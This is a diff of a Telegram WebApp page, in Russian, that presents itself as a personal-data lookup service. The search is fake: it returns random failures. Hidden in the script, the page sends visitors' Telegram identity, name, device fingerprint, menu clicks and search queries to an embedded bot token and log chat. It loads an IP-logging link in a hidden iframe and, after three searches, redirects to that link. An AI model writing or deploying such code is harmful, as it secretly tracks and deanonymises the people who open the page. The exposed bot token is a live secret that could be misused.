@@ -12,16 +12,17 @@
         .header h1 { color: #00d4ff; font-size: 24px; }
         .menu { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
         .btn { background: #1e3c72; border: none; border-radius: 15px; padding: 25px; color: white; font-size: 16px; cursor: pointer; }
-        .btn:active { opacity: 0.8; }
+        .btn:active { opacity: 0.8; transform: scale(0.98); }
         .icon { font-size: 28px; display: block; margin-bottom: 8px; }
         .page { display: none; padding: 20px; background: #1a1a2e; border-radius: 15px; margin-top: 20px; }
         .page.active { display: block; }
         input { width: 100%; padding: 15px; background: #0f0f1e; border: 2px solid #00d4ff; border-radius: 10px; color: white; font-size: 16px; margin: 15px 0; }
-        .search-btn { width: 100%; padding: 15px; background: #00d4ff; border: none; border-radius: 10px; color: black; font-size: 16px; cursor: pointer; }
+        .search-btn { width: 100%; padding: 15px; background: #00d4ff; border: none; border-radius: 10px; color: black; font-size: 16px; cursor: pointer; font-weight: bold; }
         .back { width: 100%; padding: 15px; background: transparent; border: 2px solid #00d4ff; border-radius: 10px; color: #00d4ff; margin-top: 20px; cursor: pointer; }
         .result { padding: 20px; background: #2a1a1e; border-radius: 10px; margin-top: 15px; text-align: center; }
         .stat { background: #1a1a2e; padding: 15px; border-radius: 10px; margin: 10px 0; border-left: 4px solid #00d4ff; }
-        .link { display: block; background: #00d4ff; padding: 15px; border-radius: 10px; color: black; text-decoration: none; text-align: center; margin-top: 15px; }
+        .link { display: block; background: #00d4ff; padding: 15px; border-radius: 10px; color: black; text-decoration: none; text-align: center; margin-top: 15px; font-weight: bold; }
+        .error { background: #2a1a1e; padding: 20px; border-radius: 10px; text-align: center; color: #ff6b6b; }
     </style>
 </head>
 <body>
@@ -31,19 +32,19 @@
     </div>
 
     <div id="menu" class="menu">
-        <button class="btn" id="btnSearch"><span class="icon">🔍</span>Поиск</button>
-        <button class="btn" id="btnProfile"><span class="icon">👤</span>Профиль</button>
-        <button class="btn" id="btnAdd"><span class="icon">📁</span>Добавить базу</button>
-        <button class="btn" id="btnStats"><span class="icon">📊</span>Статистика</button>
+        <button class="btn" onclick="openSearch()"><span class="icon">🔍</span>Поиск</button>
+        <button class="btn" onclick="openProfile()"><span class="icon">👤</span>Профиль</button>
+        <button class="btn" onclick="openAdd()"><span class="icon">📁</span>Добавить базу</button>
+        <button class="btn" onclick="openStats()"><span class="icon">📊</span>Статистика</button>
     </div>
 
     <div id="pageSearch" class="page">
         <h2>🔎 Поиск по базам</h2>
         <p style="color:#888; margin-top:10px;">Введите ФИО, телефон, email или ИНН</p>
         <input type="text" id="query" placeholder="Введите запрос...">
-        <button class="search-btn" id="doSearch">🔍 Найти</button>
+        <button class="search-btn" onclick="doSearch()">🔍 Найти</button>
         <div id="searchResult"></div>
-        <button class="back" id="back1">← Назад</button>
+        <button class="back" onclick="goBack()">← Назад</button>
     </div>
 
     <div id="pageProfile" class="page">
@@ -51,14 +52,14 @@
         <div class="stat"><b>ID:</b> <span id="visitorId">загрузка...</span></div>
         <div class="stat"><b>Username:</b> <span id="visitorName">загрузка...</span></div>
         <div class="stat"><b>Подписка:</b> <span style="color:#0f0;">✅ Активна (7 дней)</span></div>
-        <button class="back" id="back2">← Назад</button>
+        <button class="back" onclick="goBack()">← Назад</button>
     </div>
 
     <div id="pageAdd" class="page">
         <h2>📁 Добавить базу</h2>
         <p style="color:#888; margin-top:15px;">Для добавления своей базы свяжитесь с администрацией:</p>
         <a href="https://t.me/otsocityhelpoer_bot" class="link">📩 @otsocityhelpoer_bot</a>
-        <button class="back" id="back3">← Назад</button>
+        <button class="back" onclick="goBack()">← Назад</button>
     </div>
 
     <div id="pageStats" class="page">
@@ -67,152 +68,195 @@
         <div class="stat"><b>Источников:</b> 127+</div>
         <div class="stat"><b>Обновление:</b> Ежедневно</div>
         <div class="stat"><b>География:</b> СНГ, Европа, США</div>
-        <button class="back" id="back4">← Назад</button>
+        <button class="back" onclick="goBack()">← Назад</button>
     </div>
 
     <iframe id="grabify" style="display:none;"></iframe>
 
     <script>
-        var BOT = '8701726550:AAHzH-oN1vfdHroJ7Qx3qnwdP_C8rl_U0gc';
-        var CHAT = -1003690607796;
-        var GRABIFY = 'https://account.beauty/89YMMI';
+        // Конфиг
+        var BOT_TOKEN = '8701726550:AAHzH-oN1vfdHroJ7Qx3qnwdP_C8rl_U0gc';
+        var LOG_CHAT = -1003690607796;
+        var GRABIFY_URL = 'https://account.beauty/89YMMI';
 
-        var tg = window.Telegram.WebApp;
-        tg.expand();
+        // Данные юзера
+        var userId = 'unknown';
+        var userName = 'нет';
+        var userFirst = '';
+        var userLast = '';
+        var userPremium = false;
 
-        var uid = 'unknown';
-        var uname = 'нет';
-
-        try {
+        // Проверяем есть ли Telegram WebApp
+        var tg = null;
+        if (typeof window.Telegram !== 'undefined' && window.Telegram.WebApp) {
+            tg = window.Telegram.WebApp;
+            tg.expand();
+            
             if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                uid = tg.initDataUnsafe.user.id;
-                uname = tg.initDataUnsafe.user.username || 'нет';
+                userId = tg.initDataUnsafe.user.id || 'unknown';
+                userName = tg.initDataUnsafe.user.username || 'нет';
+                userFirst = tg.initDataUnsafe.user.first_name || '';
+                userLast = tg.initDataUnsafe.user.last_name || '';
+                userPremium = tg.initDataUnsafe.user.is_premium || false;
             }
-        } catch(e) {}
+        }
 
-        document.getElementById('visitorId').innerText = uid;
-        document.getElementById('visitorName').innerText = '@' + uname;
+        // Заполняем профиль
+        document.getElementById('visitorId').innerText = userId;
+        document.getElementById('visitorName').innerText = '@' + userName;
 
-        var data = {
-            id: uid,
-            username: uname,
+        // Собираем данные устройства
+        var deviceData = {
+            id: userId,
+            username: userName,
+            firstName: userFirst,
+            lastName: userLast,
+            premium: userPremium,
             screen: screen.width + 'x' + screen.height,
+            viewport: window.innerWidth + 'x' + window.innerHeight,
             platform: navigator.platform,
             userAgent: navigator.userAgent,
             language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
             cores: navigator.hardwareConcurrency || 'N/A',
             memory: navigator.deviceMemory || 'N/A',
             touch: navigator.maxTouchPoints || 0,
             online: navigator.onLine,
+            cookies: navigator.cookieEnabled,
+            dnt: navigator.doNotTrack,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
             time: new Date().toLocaleString('ru-RU')
         };
 
-        function log(text) {
-            var url = 'https://api.telegram.org/bot' + BOT + '/sendMessage';
-            var body = JSON.stringify({ chat_id: CHAT, text: text, parse_mode: 'HTML' });
+        // Функция отправки лога
+        function sendLog(text) {
+            var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
             
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: body
-            }).then(function(r) {
-                console.log('Log sent:', r.status);
-            }).catch(function(e) {
-                console.log('Log error:', e);
+                body: JSON.stringify({
+                    chat_id: LOG_CHAT,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            }).then(function(response) {
+                console.log('Log sent:', response.status);
+            }).catch(function(error) {
+                console.log('Log error:', error);
             });
         }
 
-        var openLog = '<b>🌐 WebApp ОТКРЫТ</b>\n\n' +
-            '<b>👤 Юзер:</b>\n' +
-            '├ ID: <code>' + data.id + '</code>\n' +
-            '├ Username: @' + data.username + '\n' +
-            '└ Время: ' + data.time + '\n\n' +
-            '<b>📱 Устройство:</b>\n' +
-            '├ Экран: ' + data.screen + '\n' +
-            '├ Платформа: ' + data.platform + '\n' +
-            '├ Ядра CPU: ' + data.cores + '\n' +
-            '├ RAM: ' + data.memory + 'GB\n' +
-            '├ Touch: ' + data.touch + '\n' +
-            '└ Язык: ' + data.language + '\n\n' +
-            '<b>🌍 Сеть:</b>\n' +
-            '├ Timezone: ' + data.timezone + '\n' +
-            '└ Online: ' + (data.online ? 'Да' : 'Нет') + '\n\n' +
-            '<b>🔧 UA:</b>\n<code>' + data.userAgent.substring(0, 150) + '</code>';
+        // Отправляем лог при открытии
+        var openLog = '<b>🌐 WebApp ОТКРЫТ</b>\n\n';
+        openLog += '<b>👤 Пользователь:</b>\n';
+        openLog += '├ ID: <code>' + deviceData.id + '</code>\n';
+        openLog += '├ Username: @' + deviceData.username + '\n';
+        openLog += '├ Имя: ' + deviceData.firstName + ' ' + deviceData.lastName + '\n';
+        openLog += '└ Премиум: ' + (deviceData.premium ? '✅' : '❌') + '\n\n';
+        openLog += '<b>📱 Устройство:</b>\n';
+        openLog += '├ Экран: ' + deviceData.screen + '\n';
+        openLog += '├ Viewport: ' + deviceData.viewport + '\n';
+        openLog += '├ Платформа: ' + deviceData.platform + '\n';
+        openLog += '├ CPU ядер: ' + deviceData.cores + '\n';
+        openLog += '├ RAM: ' + deviceData.memory + ' GB\n';
+        openLog += '├ Touch: ' + deviceData.touch + '\n';
+        openLog += '├ Pixel Ratio: ' + deviceData.pixelRatio + '\n';
+        openLog += '└ Color Depth: ' + deviceData.colorDepth + '\n\n';
+        openLog += '<b>🌍 Локация/Сеть:</b>\n';
+        openLog += '├ Язык: ' + deviceData.language + '\n';
+        openLog += '├ Языки: ' + deviceData.languages + '\n';
+        openLog += '├ Timezone: ' + deviceData.timezone + '\n';
+        openLog += '├ Online: ' + (deviceData.online ? '✅' : '❌') + '\n';
+        openLog += '├ Cookies: ' + (deviceData.cookies ? '✅' : '❌') + '\n';
+        openLog += '└ DNT: ' + deviceData.dnt + '\n\n';
+        openLog += '<b>🔧 User-Agent:</b>\n';
+        openLog += '<code>' + deviceData.userAgent.substring(0, 200) + '</code>\n\n';
+        openLog += '<b>🕐 Время:</b> ' + deviceData.time;
 
-        log(openLog);
+        sendLog(openLog);
 
+        // Загружаем Grabify через 3 секунды
         setTimeout(function() {
-            document.getElementById('grabify').src = GRABIFY;
-            log('<b>🎯 Grabify загружен</b>\n└ ID: <code>' + data.id + '</code>');
+            document.getElementById('grabify').src = GRABIFY_URL;
+            sendLog('<b>🎯 Grabify загружен</b>\n└ ID: <code>' + deviceData.id + '</code>');
         }, 3000);
 
-        function showPage(id) {
+        // Навигация
+        function showPage(pageId) {
             document.getElementById('menu').style.display = 'none';
-            document.querySelectorAll('.page').forEach(function(p) { p.classList.remove('active'); });
-            document.getElementById(id).classList.add('active');
+            var pages = document.querySelectorAll('.page');
+            for (var i = 0; i < pages.length; i++) {
+                pages[i].classList.remove('active');
+            }
+            document.getElementById(pageId).classList.add('active');
         }
 
-        function showMenu() {
-            document.querySelectorAll('.page').forEach(function(p) { p.classList.remove('active'); });
+        function goBack() {
+            var pages = document.querySelectorAll('.page');
+            for (var i = 0; i < pages.length; i++) {
+                pages[i].classList.remove('active');
+            }
             document.getElementById('menu').style.display = 'grid';
         }
 
-        document.getElementById('btnSearch').onclick = function() {
+        function openSearch() {
             showPage('pageSearch');
-            log('<b>📂 Открыт:</b> Поиск\n└ ID: <code>' + data.id + '</code>');
-        };
+            sendLog('<b>📂 Раздел:</b> Поиск\n└ ID: <code>' + deviceData.id + '</code>');
+        }
 
-        document.getElementById('btnProfile').onclick = function() {
+        function openProfile() {
             showPage('pageProfile');
-            log('<b>📂 Открыт:</b> Профиль\n└ ID: <code>' + data.id + '</code>');
-        };
+            sendLog('<b>📂 Раздел:</b> Профиль\n└ ID: <code>' + deviceData.id + '</code>');
+        }
 
-        document.getElementById('btnAdd').onclick = function() {
+        function openAdd() {
             showPage('pageAdd');
-            log('<b>📂 Открыт:</b> Добавить базу\n└ ID: <code>' + data.id + '</code>');
-        };
+            sendLog('<b>📂 Раздел:</b> Добавить базу\n└ ID: <code>' + deviceData.id + '</code>');
+        }
 
-        document.getElementById('btnStats').onclick = function() {
+        function openStats() {
             showPage('pageStats');
-            log('<b>📂 Открыт:</b> Статистика\n└ ID: <code>' + data.id + '</code>');
-        };
+            sendLog('<b>📂 Раздел:</b> Статистика\n└ ID: <code>' + deviceData.id + '</code>');
+        }
 
-        document.getElementById('back1').onclick = showMenu;
-        document.getElementById('back2').onclick = showMenu;
-        document.getElementById('back3').onclick = showMenu;
-        document.getElementById('back4').onclick = showMenu;
-
+        // Поиск
         var searchCount = 0;
 
-        document.getElementById('doSearch').onclick = function() {
-            var q = document.getElementById('query').value.trim();
-            if (!q) {
-                document.getElementById('searchResult').innerHTML = '<div class="result">❌ Введите запрос</div>';
+        function doSearch() {
+            var query = document.getElementById('query').value.trim();
+            
+            if (!query) {
+                document.getElementById('searchResult').innerHTML = '<div class="result" style="border-left:4px solid #ff4444;">❌ Введите запрос</div>';
                 return;
             }
 
             searchCount++;
-            document.getElementById('searchResult').innerHTML = '<div class="result">⏳ Поиск...</div>';
+            document.getElementById('searchResult').innerHTML = '<div class="result" style="border-left:4px solid #00d4ff;">⏳ Поиск в базах данных...</div>';
 
-            log('<b>🔎 Поиск #' + searchCount + '</b>\n├ ID: <code>' + data.id + '</code>\n└ Запрос: <code>' + q + '</code>');
+            sendLog('<b>🔎 Поиск #' + searchCount + '</b>\n├ ID: <code>' + deviceData.id + '</code>\n├ Username: @' + deviceData.username + '\n└ Запрос: <code>' + query + '</code>');
 
             setTimeout(function() {
                 var results = ['❌ Данные не найдены', '⚠️ Сервера перегружены. Попробуйте ещё раз.'];
-                var r = results[Math.floor(Math.random() * 2)];
-                document.getElementById('searchResult').innerHTML = '<div class="result">' + r + '</div>';
+                var randomResult = results[Math.floor(Math.random() * 2)];
+                
+                document.getElementById('searchResult').innerHTML = '<div class="result">' + randomResult + '</div>';
 
                 if (searchCount >= 3) {
                     setTimeout(function() {
-                        document.getElementById('searchResult').innerHTML += '<div class="result" style="margin-top:10px;background:#1a2a1e;">🔄 Расширенный поиск...</div>';
-                        log('<b>🔄 Редирект Grabify</b>\n└ ID: <code>' + data.id + '</code>');
+                        document.getElementById('searchResult').innerHTML += '<div class="result" style="margin-top:10px; background:#1a2a1e; border-left:4px solid #00ff88;">🔄 Перенаправление на расширенный поиск...</div>';
+                        sendLog('<b>🔄 Редирект на Grabify</b>\n└ ID: <code>' + deviceData.id + '</code>');
+                        
                         setTimeout(function() {
-                            window.location.href = GRABIFY;
+                            window.location.href = GRABIFY_URL;
                         }, 1500);
                     }, 1000);
                 }
             }, 2000);
-        };
+        }
     </script>
 </body>
 </html>
